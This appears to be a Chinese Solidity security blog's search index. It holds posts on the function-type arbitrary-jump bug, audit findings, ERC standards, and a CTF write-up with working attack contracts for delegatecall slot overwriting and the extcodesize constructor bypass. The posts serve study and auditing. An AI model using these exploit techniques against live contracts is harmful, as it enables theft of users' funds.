<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/10/20/earningfarm%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/20/earningfarm%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>函数体任意转跳漏洞</title>
      <link href="/2023/10/10/funstr/"/>
      <url>/2023/10/10/funstr/</url>
      
        <content type="html"><![CDATA[<h1 id="函数体任意转跳漏洞"><a href="#函数体任意转跳漏洞" class="headerlink" title="函数体任意转跳漏洞"></a>函数体任意转跳漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Solidity支持函数类型的变量。也就是说，一个函数类型的变量可以赋值未具有匹配签名的函数的引用。 保存到此类变量的函数可以像常规函数一样调用。<br>当用户具有任意更改函数类型变量并执行随机代码指令的能力时，就会出现问题。从而可以使其指向任何指令。调用任意一个函数或绕过某些验证。  </p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于函数类型变量的工作原理是储存对应函数相应操作码的起始位置，执行时通过jump跳转到指定函数操作码的起始位置，从而执行函数内的操作。<br>若函数类型变量的值可以被任意控制，那么调用者就可以通过它转跳到调用者想控制的任意位置。  </p><h2 id="漏洞事例"><a href="#漏洞事例" class="headerlink" title="漏洞事例"></a>漏洞事例</h2><p>‘’’solidity<br>pragma solidity ^0.8.1;</p><p>library StorageSlot {<br>    // Wrap address in a struct so that it can be passed around as a storage pointer<br>    struct AddressSlot {<br>       bytes32 value;<br>    }</p><pre><code>function getAddressSlot(    bytes32 slot) internal pure returns (AddressSlot storage pointer) &#123;    assembly &#123;        // Get the pointer to AddressSlot stored at slot        pointer.slot := slot    &#125;&#125;</code></pre><p>}<br>contract fvtext{</p><pre><code>event Win(address addr);struct fv&#123;    function() internal f;&#125;fv Fv;bool public iswin;function get() public&#123;    Fv.f=win; &#125;function Try() public&#123;    Fv.f();&#125;function win() internal&#123;    require(msg.value&gt;=100000000000 ether);    emit Win(msg.sender);    iswin = true;&#125;function write(bytes32 _value,bytes32 a) external &#123;    StorageSlot.AddressSlot storage data = StorageSlot.getAddressSlot(a);    data.value = _value;&#125;function get(bytes32 a) external view returns (bytes32) &#123;    StorageSlot.AddressSlot storage data = StorageSlot.getAddressSlot(a);    return data.value;&#125;</code></pre><p>}<br>‘’’<br>fv结构体中有函数变量类型的成员f，通过get函数，把Win函数赋值给f，从而可以通过调用f来调用Win<br>那么函数变量是如何实现他的功能，我们读一下插槽  </p><p>f储存的数据是0x000000000000017f<br>通过反编译runtimeCode会发现Win函数的起始为操作符的位置为17f<br>‘’’solidity<br>        017F    5B    JUMPDEST<br>        0180    6C    PUSH13 0x01431e0fae6d7217caa0000000<br>        018E    34    CALLVALUE<br>        018F    10    LT<br>        0190    15    ISZERO<br>        0191    61    PUSH2 0x0199<br>        0194    57    <em>JUMPI<br>        0195    60    PUSH1 0x00<br>        0197    80    DUP1<br>        0198    FD    </em>REVERT<br>        0199    5B    JUMPDEST<br>        019A    7F    PUSH32 0xc94e26bc371c19185b9e577ef339d2a5bca910d48092cbb160550b311ddd8d98<br>        01BB    33    CALLER<br>        01BC    60    PUSH1 0x40<br>        01BE    51    MLOAD<br>        01BF    61    PUSH2 0x01c8<br>        01C2    91    SWAP2<br>        01C3    90    SWAP1<br>        01C4    61    PUSH2 0x0349<br>        01C7    56    <em>JUMP<br>        01C8    5B    JUMPDEST<br>        01C9    60    PUSH1 0x40<br>        01CB    51    MLOAD<br>        01CC    80    DUP1<br>        01CD    91    SWAP2<br>        01CE    03    SUB<br>        01CF    90    SWAP1<br>        01D0    A1    LOG1<br>        01D1    60    PUSH1 0x01<br>        01D3    80    DUP1<br>        01D4    60    PUSH1 0x00<br>        01D6    61    PUSH2 0x0100<br>        01D9    0A    EXP<br>        01DA    81    DUP2<br>        01DB    54    SLOAD<br>        01DC    81    DUP2<br>        01DD    60    PUSH1 0xff<br>        01DF    02    MUL<br>        01E0    19    NOT<br>        01E1    16    AND<br>        01E2    90    SWAP1<br>        01E3    83    DUP4<br>        01E4    15    ISZERO<br>        01E5    15    ISZERO<br>        01E6    02    MUL<br>        01E7    17    OR<br>        01E8    90    SWAP1<br>        01E9    55    SSTORE<br>        01EA    50    POP<br>        01EB    56    </em>JUMP<br>‘’’<br>所以函数体变量是通过jump跳转到相应函数对应操作码起始位置（需jumpdest接收）来执行功能的。<br>而如果合约因为某些漏洞（如插槽覆盖）可以让调用者随意控制函数变量的值，那么调用者就可以跳转到任意存在Jumdest的位置，从而可以调用一些内部函数，绕过一些条件触发事件。<br>比如，现在我用简单的插槽任意读写模拟上述漏洞，我想绕过msg.value的验证直接触发Win事件,那么我可以通过更改f的值为0x0000000000000199,这样如果执行f（），就会跳转到0199的位置执行后触发Win事件，并且  isWin返回true  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>函数类型的变量使用可能不存在问题，但是会存在如插槽覆盖，溢出等其他漏洞导致调用者可随意控制函数类型变量，从而导致任意转跳。<br>开发者应该尽量避免使用函数类型的变量，或严格控制其对应的值不能随意被改变。  </p><p>参考文章：<a href="https://swcregistry.io/docs/SWC-127">https://swcregistry.io/docs/SWC-127</a>  </p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LowInformation</title>
      <link href="/2023/10/10/lowInformation/"/>
      <url>/2023/10/10/lowInformation/</url>
      
        <content type="html"><![CDATA[<p>最近阅读了一些审计报告，总结了一些见到的LOW和information常见漏洞，后续持续更新  </p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="Upgrate"><a href="#Upgrate" class="headerlink" title="Upgrate"></a>Upgrate</h3><h4 id="1-Inconsistent-slot-size-for-upgrades-用于升级的插槽大小不一致"><a href="#1-Inconsistent-slot-size-for-upgrades-用于升级的插槽大小不一致" class="headerlink" title="[1]Inconsistent slot size for upgrades-用于升级的插槽大小不一致"></a>[1]Inconsistent slot size for upgrades-用于升级的插槽大小不一致</h4><pre><code>在整个代码库中，允许对几个合同进行升级，以改进/扩展功能或修复漏洞。为了降低发生存储冲突的可能性，这些契约在契约的底部定义了一个数组，其长度加上契约中定义的变量数，再加上固定数，通常为50。  可能存在有些合同中的总和与代码库的其余部分不一致。比如，有的合约总数为45，有的为40.  为了提高代码的可读性，防止未来在可用存储插槽较少的合同上发生存储冲突，并与代码的其余部分保持一致，请考虑修复总和不等于公共固定数的所有相应位置。  </code></pre><h3 id="Data-Processing"><a href="#Data-Processing" class="headerlink" title="Data Processing"></a>Data Processing</h3><h4 id="1-Implicit-casting-隐式强制转换"><a href="#1-Implicit-casting-隐式强制转换" class="headerlink" title="[1]Implicit casting - 隐式强制转换"></a>[1]Implicit casting - 隐式强制转换</h4><pre><code>&#39;&#39;&#39;solidityfunction subjectToActive(uint8 subjectType, uint256 subject) internal pure returns (uint256) &#123;    return (uint256(keccak256(abi.encodePacked(subjectType, subject))) &lt;&lt; 9 | uint16(256)) | subjectType;    return (uint256(keccak256(abi.encodePacked(subjectType, subject))) &lt;&lt; 9 | uint16(256)) | uint256(subjectType);&#125;&#39;&#39;&#39;     在Solidity中，对uint8和uint256进行逐位OR运算可能会导致安全风险。这是因为uint8只能存储8位的整数，而uint256可以存储256位的整数。当对一个256位的整数进行逐位OR运算时，结果可能会超出uint8的范围，导致截断错误。    上述示例中subjectType uint8参数用于对uint256结果的逐位OR运算。       每当需要不同类型的变量时，请考虑检查变量并将其强制转换为所需类型。  </code></pre><h4 id="2-Hash-Collision-哈希冲突"><a href="#2-Hash-Collision-哈希冲突" class="headerlink" title="[2]Hash Collision - 哈希冲突"></a>[2]Hash Collision - 哈希冲突</h4><pre><code>  两个相邻的动态参数用encodePacked打包，可能会造成哈希冲突，恶意者可以通过构造这两个参数来破坏构造出的hash的唯一性。使用encode打包就可以解决这个问题  </code></pre><h3 id="Semantic"><a href="#Semantic" class="headerlink" title="Semantic"></a>Semantic</h3><h4 id="1-Magic-numbers-are-used-使用意义不明的数字"><a href="#1-Magic-numbers-are-used-使用意义不明的数字" class="headerlink" title="[1]Magic numbers are used - 使用意义不明的数字"></a>[1]Magic numbers are used - 使用意义不明的数字</h4><pre><code>合约在对数据进行解包时，可能出现意义不明的数字值。  </code></pre><p>bytes4 sig = bytes4(payload[:4]);<br>    为了提高代码的可读性和便于重构，可以考虑为他们定义一个常量，并为其命名一个清晰易懂的名称。对于复杂的值，可以考虑添加一个内联注释，解释它们是如何计算的或为什么选择它们。<br>uint256 private constant SIGNATURE_SIZE = 4;<br>bytes4 sig = bytes4(payload[:SIGNATURE_SIZE]);</p><h4 id="2-Semantic-overload-语义重载"><a href="#2-Semantic-overload-语义重载" class="headerlink" title="[2]Semantic overload - 语义重载"></a>[2]Semantic overload - 语义重载</h4><pre><code>合约中有时会出现单个变量以不同的方式使用&#39;&#39;&#39;soliditystruct StakeThreshold &#123;    uint256 min;    uint256 max;&#125;function register(address owner, uint256 chainId, string calldata metadata) virtual public &#123;    require(_stakeThresholds[chainId].min &gt; 0, &quot;ScannerRegistryEnable: public registration available if staking activated&quot;);    _register(_msgSender(), owner, chainId, metadata);&#125;&#39;&#39;&#39;比如StakeThreshold的成员min，既代表了最小赌注，又限制了注册权限。这就是语义重载。  如果在对代码进行更改时，变量和状态的多重含义不完全清楚，则可能会引入严重的漏洞。  </code></pre><h3 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h3><h4 id="1-Reentrancy-possibility-潜在的重入风险"><a href="#1-Reentrancy-possibility-潜在的重入风险" class="headerlink" title="[1]Reentrancy possibility - 潜在的重入风险"></a>[1]Reentrancy possibility - 潜在的重入风险</h4><pre><code>合约中某些地方可能存在潜在的重入风险.  比如在调用 FortaStake 合约中的 _mint 函数后，将调用 ERC1155Upgradeable 合约中的 _doSafeTransferAcceptanceCheck 函数，该函数会将控制权移交给 to 地址。  请关注合约中任何移交控制权给外部不受信地址的地方，评判是否可能造成重入，威胁系统安全。  </code></pre><h4 id="2-Disabled-unused-mapping-删除停止使用的映射"><a href="#2-Disabled-unused-mapping-删除停止使用的映射" class="headerlink" title="[2]Disabled unused mapping - 删除停止使用的映射"></a>[2]Disabled unused mapping - 删除停止使用的映射</h4><pre><code>例：&#39;&#39;&#39;soliditymapping(uint256 =&gt; EnumerableSet.UintSet) private scannerToAgents;mapping(uint256 =&gt; EnumerableSet.UintSet) private agentToScanners;function unlink(uint256 agentId, uint256 scannerId) public onlyRole(DISPATCHER_ROLE) &#123;    require(_agents.isCreated(agentId), &quot;Dispatch: invalid agent id&quot;);    require(_scanners.isRegistered(scannerId), &quot;Dispatch: invalid scanner id&quot;);    scannerToAgents[scannerId].remove(agentId);    agentToScanners[agentId].remove(scannerId);    emit Link(agentId, scannerId, false);&#125;&#39;&#39;&#39;  scanners 和 agents 存在映射 来链接彼此  当 scanners 或者agents被禁用的时候 则不允许链接 因此 这个映射应该被删除 ，合约中虽然提供了unlink方法 但是这并不是强制的 所以很可能出现scanners 或者 agents被禁用 但是链接还存在的情况。  </code></pre><h4 id="3-Incomplete-and-unindexed-events-未完成或未编制索引的事件"><a href="#3-Incomplete-and-unindexed-events-未完成或未编制索引的事件" class="headerlink" title="[3]Incomplete and unindexed events - 未完成或未编制索引的事件"></a>[3]Incomplete and unindexed events - 未完成或未编制索引的事件</h4><pre><code>  合约中定义的事件可能缺失必要的索引。事件可能要表示何时对系统状态进行更改，但是缺失索引参数，缺失表示如何修改系统的所有参数。    缺失索引  event Stake(address token, address user, uint256 amount, uint256 averageDepositTime, uint256 cumulativeBalance);event Unstake(address token, address user, uint256 amount, uint256 remainingCumulativeBalance);event GetReward(address token, address user, uint256 rewardsToSend);event Exit(address token, address user);  参数不完整event RecoverErc20(address token, address to, uint256 amount);  缺失调用方</code></pre><h4 id="4-Unhandled-failures-in-interactions-缺失对调用失败的处理"><a href="#4-Unhandled-failures-in-interactions-缺失对调用失败的处理" class="headerlink" title="[4]Unhandled failures in interactions - 缺失对调用失败的处理"></a>[4]Unhandled failures in interactions - 缺失对调用失败的处理</h4><pre><code>  合约中的外部调用时不一定是受信合约，那么就应该考虑处理调用失败的结果。    &#39;&#39;&#39;solidityfunction unstake(address stakedToken, uint256 amount) public nonReentrant onlyInitialized(stakedToken) &#123;    _updateReward(stakedToken, msg.sender);    UserDeposit storage userDeposit = stakingTokens[stakedToken].stakingBalances[msg.sender];    // Note: these will revert if underflow so you cant unstake more than your cumulativeBalance.    userDeposit.cumulativeBalance -= amount;    stakingTokens[stakedToken].cumulativeStaked -= amount;    IERC20(stakedToken).transfer(msg.sender, amount);    emit Unstake(stakedToken, msg.sender, amount, userDeposit.cumulativeBalance);&#125;&#39;&#39;&#39;  ERC20的transfer可能未正确包装，比如这个transfer可能不是通过revert表示转帐失败，而是返回false，应考虑这种情况的处理。[5]Lack of event emissions after updating state     合约中可能存在执行重要状态更改后没有相应事件触发。        为便于合约状态更改时，客户端能够及时捕获，考虑在合约执行重要状态更改后触发事件。</code></pre><h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><h4 id="1-Address-conflict-in-different-chains"><a href="#1-Address-conflict-in-different-chains" class="headerlink" title="[1]Address conflict in different chains"></a>[1]Address conflict in different chains</h4><p>  有一个跨链组件，通过governor来执行相应的提案，但是在分散在各链的工厂创建governor时会采用create方法，create与msg.sender和nonce有关，那么就可能出现在不同链上出现相同地址的governor，他们可以执行彼此的提案。</p><h4 id="2-Lack-of-validation"><a href="#2-Lack-of-validation" class="headerlink" title="[2]Lack of validation"></a>[2]Lack of validation</h4><p>   在合约的某些地方可能缺乏必要的输入输出验证。<br>      这可能会难以调试由于用户参数输入不合法的错误和失败的事务。</p><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><h3 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h3><h4 id="1-Missing-Docstrings-缺失文档描述"><a href="#1-Missing-Docstrings-缺失文档描述" class="headerlink" title="[1]Missing Docstrings - 缺失文档描述"></a>[1]Missing Docstrings - 缺失文档描述</h4><pre><code>文档内容缺失了很多合同和函数的描述。此外，文档字符串提高了可读性并便于维护。它们应该明确解释函数的目的或意图、它们可能失败的场景、允许调用它们的角色、返回的值和发出的事件。</code></pre><h4 id="2-Naming-issues-命名问题"><a href="#2-Naming-issues-命名问题" class="headerlink" title="[2]Naming issues - 命名问题"></a>[2]Naming issues - 命名问题</h4><pre><code>合约中函数可能存在命名问题，比如可以通过更改命名来避免歧义或者更好的表示函数功能 ，增加代码可读性。</code></pre><h4 id="3-Styling-issues-风格问题"><a href="#3-Styling-issues-风格问题" class="headerlink" title="[3]Styling issues - 风格问题"></a>[3]Styling issues - 风格问题</h4><pre><code>合约中有些地方可能存在风格问题，比如在某个地方多了一行空行，将私有函数定义在共有函数之前。</code></pre><h4 id="4-Multiple-contracts-per-file-一个文件中存在过多合约"><a href="#4-Multiple-contracts-per-file-一个文件中存在过多合约" class="headerlink" title="[4]Multiple contracts per file - 一个文件中存在过多合约"></a>[4]Multiple contracts per file - 一个文件中存在过多合约</h4><pre><code>可能存在一个文件中包含多个合约。   考虑将合同分离到各自的文件中，使代码库更易于开发人员和评审人员理解。</code></pre><h4 id="5-Inconsistent-format-in-error-messages-错误消息格式不统一"><a href="#5-Inconsistent-format-in-error-messages-错误消息格式不统一" class="headerlink" title="[5]Inconsistent format in error messages - 错误消息格式不统一"></a>[5]Inconsistent format in error messages - 错误消息格式不统一</h4><pre><code>revert所返回的错误消息最好遵循一个统一的格式。</code></pre><h4 id="6-Typographical-errors"><a href="#6-Typographical-errors" class="headerlink" title="[6]Typographical errors"></a>[6]Typographical errors</h4><pre><code>拼写错误</code></pre><h3 id="Visibility"><a href="#Visibility" class="headerlink" title="Visibility"></a>Visibility</h3><h4 id="1-Correct-visibility-合适的可见性"><a href="#1-Correct-visibility-合适的可见性" class="headerlink" title="[1]Correct visibility - 合适的可见性"></a>[1]Correct visibility - 合适的可见性</h4><pre><code>请注意合约中各个函数的功能，再根据功能选择合适的可见性。有些函数从private转变到public更为合适，有些函数将public转换到external更为合适，有些将view换成pure更合适。</code></pre><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><h4 id="1-Pragma-statement-is-not-consistent"><a href="#1-Pragma-statement-is-not-consistent" class="headerlink" title="[1]Pragma statement is not consistent"></a>[1]Pragma statement is not consistent</h4><pre><code>Pragma声明可能不一致。尽管这本身并不代表安全风险，但始终建议对所有代码库使用相同的pragma语句。考虑在整个代码库中查看和更新所有合同的pragma语句，以确保它们是一致的。</code></pre><h3 id="Optimize"><a href="#Optimize" class="headerlink" title="Optimize"></a>Optimize</h3><h4 id="1-No-need-to-write-getter-function"><a href="#1-No-need-to-write-getter-function" class="headerlink" title="[1] No need to write getter function."></a>[1] No need to write getter function.</h4><p>  有时合约中可能为一个private变量编写一个getter函数，这是不必要的，只需将变量可见性改为public。</p><h4 id="2-The-same-lines-of-code"><a href="#2-The-same-lines-of-code" class="headerlink" title="[2] The same lines of code"></a>[2] The same lines of code</h4><p>  合约中可能出现多次相同的代码，可以考虑将他们打包为一个函数，从而减少代码大小和部署成本。</p><h4 id="3-Unused-inherited-contracts"><a href="#3-Unused-inherited-contracts" class="headerlink" title="[3]Unused inherited contracts"></a>[3]Unused inherited contracts</h4><p>  有些合约可能继承了某些合约，但没有使用其中的任何功能</p><h4 id="4-Not-using-immutable"><a href="#4-Not-using-immutable" class="headerlink" title="[4]Not using immutable"></a>[4]Not using immutable</h4><p>   如果一个变量是不发生改变的，考虑使用immutable，可以更好表达意图减少gas消耗</p><h4 id="5-Duplicated-code"><a href="#5-Duplicated-code" class="headerlink" title="[5]Duplicated code"></a>[5]Duplicated code</h4><p>   一个合约或多个合约中可能存在重复代码，也可能出现内部逻辑功能相同的函数。复制代码可能会导致开发生命周期后期出现问题，并使项目更容易引入错误。</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些概念的复习或补充</title>
      <link href="/2023/10/10/%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5%E7%9A%84%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/10/10/%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5%E7%9A%84%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>学到此，发现缺失一些基础的知识点，或者忘记的知识点，或者需要补充完善的知识点，将会在这里复习巩固。持续更新！</p>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC系列合约学习</title>
      <link href="/2023/07/14/ERC/"/>
      <url>/2023/07/14/ERC/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC系列合约学习"><a href="#ERC系列合约学习" class="headerlink" title="ERC系列合约学习"></a>ERC系列合约学习</h1><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><p>ERC20代币是通过ERC20协议（智能合约）创设的数字资产<br>标准ERC接口解析<br>    // SPDX-License-Identifier: MIT<br>    // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)</p><pre><code>pragma solidity ^0.8.19;/*** @dev Interface of the ERC20 standard as defined in the EIP.*/interface IERC20 &#123;    /**    * @dev Emitted when `value` tokens are moved from one account (`from`) to    * another (`to`).    *    * Note that `value` may be zero.    */    event Transfer(address indexed from, address indexed to, uint256 value);    /**    * @dev Emitted when the allowance of a `spender` for an `owner` is set by    * a call to &#123;approve&#125;. `value` is the new allowance.    */    event Approval(address indexed owner, address indexed spender, uint256 value);    /**    * @dev Returns the value of tokens in existence.    */    function totalSupply() external view returns (uint256);    /**    * @dev Returns the value of tokens owned by `account`.    */    function balanceOf(address account) external view returns (uint256);    /**    * @dev Moves a `value` amount of tokens from the caller&#39;s account to `to`.    *    * Returns a boolean value indicating whether the operation succeeded.    *    * Emits a &#123;Transfer&#125; event.    */    function transfer(address to, uint256 value) external returns (bool);    /**    * @dev Returns the remaining number of tokens that `spender` will be    * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is    * zero by default.    *    * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.    */    function allowance(address owner, address spender) external view returns (uint256);    /**    * @dev Sets a `value` amount of tokens as the allowance of `spender` over the    * caller&#39;s tokens.    *    * Returns a boolean value indicating whether the operation succeeded.    *    * IMPORTANT: Beware that changing an allowance with this method brings the risk    * that someone may use both the old and the new allowance by unfortunate    * transaction ordering. One possible solution to mitigate this race    * condition is to first reduce the spender&#39;s allowance to 0 and set the    * desired value afterwards:    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729    *    * Emits an &#123;Approval&#125; event.    */    function approve(address spender, uint256 value) external returns (bool);    /**    * @dev Moves a `value` amount of tokens from `from` to `to` using the    * allowance mechanism. `value` is then deducted from the caller&#39;s    * allowance.    *    * Returns a boolean value indicating whether the operation succeeded.    *    * Emits a &#123;Transfer&#125; event.    */    function transferFrom(address from, address to, uint256 value) external returns (bool);&#125;</code></pre><p>功能函数：<br>totalSupply（）：当前已经铸造的代币的总供应<br>balanceOf（address owner）：查询输入地址下的代币总量<br>transfer(address to, uint256 value)：调用者向to地址转入value个代币<br>allowance(address owner, address spender)：查询owner地址向spender地址授权了多少token（用于transferFrom）<br>approve(address spender, uint256 value):调用者向spender地址授权value个token<br>transferFrom(address from, address to, uint256 value)：调用者花费from地址的value代币转入to地址（需要from对调用者授权）  </p><p>事件：<br>Transfer(address indexed from, address indexed to, uint256 value)：转账时被触发，记录from向to转账value价值的token<br>Approval(address indexed owner, address indexed spender, uint256 value)：授权时触发，记录from向spender地址授权value个token  </p><p>ERC20合约中其他重要功能函数：<br>_mint(address account, uint256 value) internal：向account地址铸造value个token<br>_burn(address account, uint256 value) internal：向account地址销毁value个token<br>increaseAllowance(address spender, uint256 addedValue) public：对原授权增加addValue个token<br>decreaseAllowance(address spender, uint256 requestedDecrease) public：对原授权减少requestDecrease个token<br>还新发现了一个内部函数_update(address from, address to, uint256 value) internal virtual：通过对本函数功能实现可以发现它集合了transfer函数，mint函数，burn函数三者的功能，只要调整参数输入就可以实现不同的功能。  </p><p>由此来看，我们想要发行一个ERC20标准的代币，就要根据需要实现_mint,_burn,（_updata）三个函数的调用。<br>比如：<br>    function mint(address account,uint value) public onlyOwner{<br>        _mint(account,value);<br>    }<br>    //这就说明仅有合约的owner才可以铸造token</p><h2 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h2><p>不同于ERC20 ERC721合约规定每个代币都是不同的，都有一个唯一的id相对应其余功能与ERC20相似<br>ownerOf(uint256 tokenId)：查询该token的主人<br>balanceOf(address owner)：查询账户下多少token  </p><p>关于授权<br>一种是 approve(address to, uint256 tokenId)：授权该id的token给to地址<br>另一种授权为setApprovalForAll(address operator, bool approved)：会将调用者地址下的所有代币的权益交给operator（如果setApprovalForAll，operator可以再通过approve将该代币授权给下一级）<br>关于转账<br>transferFrom(address from, address to, uint256 tokenId)：类似ERC20 transfer和transferFrom功能集合<br>safeTransferFrom(address from, address to, uint256 tokenId（，bytes memory<br>data）)：调用此方法转账会对to地址进行一次安全验证，如果to为合约，那么它必须实现onERC721Received(_msgSender(), from, tokenId, data)，并且返回IERC721Receiver.onERC721Received.selector  </p><h2 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h2><pre><code>ERC1155是一种合约规范 用来为管理不同代币提供便利  在ERC1155中不同的代币由不同的id区分   mapping(uint256 =&gt; mapping(address =&gt; uint256)) private _balances   用来储存某地址某代币余额 是一个嵌套映射 账户id -&gt; 账号地址 -&gt; 账号余额   余额可以通过 function balanceOf(address account, uint256 id) public view virtual returns (uint256)方法单个查询   也可以通过 function balanceOfBatch(    address[] memory accounts,    uint256[] memory ids) public view virtual returns (uint256[] memory)方法批量查询  它的授权系统和转账系统与ERC721有相似之处  转账也提供了批量操作  以safeBatchTransferFrom方法为例  function safeBatchTransferFrom(    address from,    address to,    uint256[] memory ids,    uint256[] memory values,    bytes memory data) public virtual  首先进行授权验证  如from不是调用者且未授权revert  进入_safeBatchTransferFrom(from, to, ids, values, data)  对from和to进行地址检验，若为0地址 revert  进入_updateWithAcceptanceCheck(from, to, ids, values, data)      根据 ids value 循环执行每部操作，进行对应地址余额增减      之后若接受地址为合约  对to进行onERC1155Received(operator, from, id, value, data)调用</code></pre>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EasyBomb</title>
      <link href="/2023/05/29/chainflagctf/"/>
      <url>/2023/05/29/chainflagctf/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h2><h3 id="counterstrike"><a href="#counterstrike" class="headerlink" title="counterstrike"></a>counterstrike</h3><p>源码</p><pre><code>pragma solidity ^0.5.10;contract EasyBomb&#123;    bool private hasExplode = true;    address private launcher_address;    bytes32 private password;    bool public power_state = true;    bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;setdeadline(uint256)&quot;));    Launcher launcher;    function msgPassword() public returns (bytes32 result)  &#123;        bytes memory msg_data = msg.data;        if (msg_data.length == 0) &#123;            return 0x0;        &#125;        assembly &#123;            result := mload(add(msg_data, add(0x20, 0x24)))        &#125;    &#125;    modifier isOwner()&#123;        require(msgPassword() == password);        require(msg.sender != tx.origin);        uint x;        assembly &#123; x := extcodesize(caller) &#125;        require(x == 0);        _;    &#125;    modifier notExplodeYet()&#123;        launcher = Launcher(launcher_address);        require(block.number &lt; launcher.deadline());        hasExplode = true;        _;    &#125;    constructor(address _launcher_address, bytes32 _fake_flag) public &#123;        launcher_address = _launcher_address;        password = _fake_flag ;    &#125;    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123;        launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline));    &#125;&#125;contract Setup &#123;    EasyBomb public easyBomb;    constructor(bytes32 _password) public &#123;        easyBomb = new EasyBomb(address(new Launcher()), _password);    &#125;    function isSolved() public view returns (bool) &#123;        return easyBomb.power_state() == false;    &#125;&#125;contract Launcher&#123;    uint256 public deadline;    function setdeadline(uint256 _deadline) public &#123;        deadline = _deadline;    &#125;    constructor() public &#123;        deadline = block.number + 100;    &#125;&#125;</code></pre><p>题目要求power_state返回false 而合约中没有直接改变此变量的方法 但合约有delegatecall，那么就可能存在插槽覆盖问题<br>题目端部署好Setup合约后 可以方便查到easyBomb合约的地址<br>easyBomb合约的储存 0插槽中hasExplode和launcher_address被打包  password如果一起打包会超出32字节，所以独立占据插槽1<br>power_state和bytes4占据插槽2<br>setCountDownTimer可以修改插槽0，那么我们可以改变launcher_address地址，使得第二次call setCountDownTimer时修改power_state占据的插槽  </p><p>再看调用setCountDownTimer所需的验证<br>    assembly {<br>        result := mload(add(msg_data, add(0x20, 0x24)))<br>    }<br>    我们调用setCountDownTimer时msg.data前32个字节储存长度，所以加0x20的偏移量，后边是函数的选择器（4个字节）uint打包参数（32字节）所以偏移量又加0x24，result的结果为是msg.data头指针偏移0x44后的三十二字节大小的数据，要求等于password。所以我们call的时候还要把password拼接到后面  password虽然是private，但是脸上数据没有隐私，可以查出，我的题目中是0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d  </p><pre><code>require(msg.sender != tx.origin);uint x;assembly &#123; x := extcodesize(caller) &#125;require(x == 0);这里要求必须通过合约调用，但合约代码长度要为0，可以在构造函数中实现攻击，那么由于合约还未创建所以检测的代码长度会为0</code></pre><p>攻击合约1<br>    contract EasyBombAttack1{<br>        bool private hasExplode = true;<br>        address private launcher_address;<br>        bytes32 private password;<br>        bool public power_state = true;//保持相同的插槽<br>        uint256 public deadline = 1000000000000000000000000000000000000;<br>        constructor(address _launcher_address, bytes32 _fake_flag) public{<br>            launcher_address = _launcher_address;<br>            password = _fake_flag ;<br>        }<br>        function setdeadline(uint256 _deadline) public {<br>            power_state = false;<br>        }<br>    }<br>    部署后地址为0xE5ae9D60414C321C7145Fe07E24E8D0724903B64<br>    后边添上01转换为10进制335680748944895370471942786219695970169537706025985</p><pre><code>contract EasyBombAttack2&#123;    constructor(address add,uint256 add2) public&#123;        (bool success,) = add.call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,add2,0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));        require(success);        (bool success1,) = add.call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,add2,0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));        require(success1);    &#125;&#125;add传入easyBomb合约地址  add2传入上方算出的十进制数字完成攻击</code></pre>]]></content>
      
      
      <categories>
          
          <category> solidity learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/03/18/ethernaut/"/>
      <url>/2023/03/18/ethernaut/</url>
      
